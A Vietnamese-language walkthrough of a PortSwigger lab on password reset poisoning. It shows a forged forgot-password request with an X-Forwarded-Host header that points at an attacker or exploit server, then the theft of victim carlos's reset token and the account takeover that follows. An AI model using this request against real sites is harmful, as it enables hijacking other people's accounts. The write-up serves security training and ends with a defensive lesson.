![[auth-reset-poisoning.png]]
-mô tả lab: chức năng forgot-password nó tạo link reset dựa vào header `X-Forwarded-Host` mà mình gửi lên. Mình sẽ đầu độc link đó để cướp token của `carlos`.

> [!NOTE]
> -link lab: https://portswigger.net/web-security/host-header/exploiting/lab-password-reset-poisoning (mình để ở phần auth vì nó vẫn là reset password)

### hướng giải
- [ ] mình request `/forgot-password` với user của mình, sau đó quan sát gói tin này, mình thấy bình thường link reset là `https://LAB-ID.web-security-academy.net/reset-password?token=...`
- [ ] mình thử thêm header `X-Forwarded-Host: evil.com`, mình thấy link trong email đổi thành `https://evil.com/reset-password?token=...`
- [ ] => nên mình hiểu là server lấy host từ header này mà không validate. Vậy mình sẽ gửi request reset cho `carlos` nhưng host là exploit-server của mình, để khi `carlos` click (thực ra là bot của lab tự click) thì token sẽ bay về server mình
- [ ] sau đó mình dùng token đó reset password `carlos`

### giải
-bước 1: mình lấy URL exploit-server mà lab cho (VD: `https://exploit-LAB.web-security-academy.net`).

-bước 2: mình gửi request reset cho `carlos`:
```
POST /forgot-password HTTP/1.1
Host: LAB-ID.web-security-academy.net
X-Forwarded-Host: exploit-LAB.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=carlos
```
![[auth-poisoning-request.png]]

-bước 3: mình vào exploit-server xem log, sau khi quan sát gói tin này, mình thấy có request tới:
```
GET /reset-password?token=TOKEN_CUA_CARLOS HTTP/1.1
```
-mình copy token đó.

-bước 4: mình vào `https://LAB-ID.web-security-academy.net/reset-password?token=TOKEN_CUA_CARLOS`, mình đặt password mới là `123456` cho `carlos`.

-bước 5: mình login `carlos:123456` là solve.

> [!NOTE]
> -bài học của mình: không bao giờ lấy host từ header do client gửi để tạo link quan trọng. Phải dùng host cứng trong config.
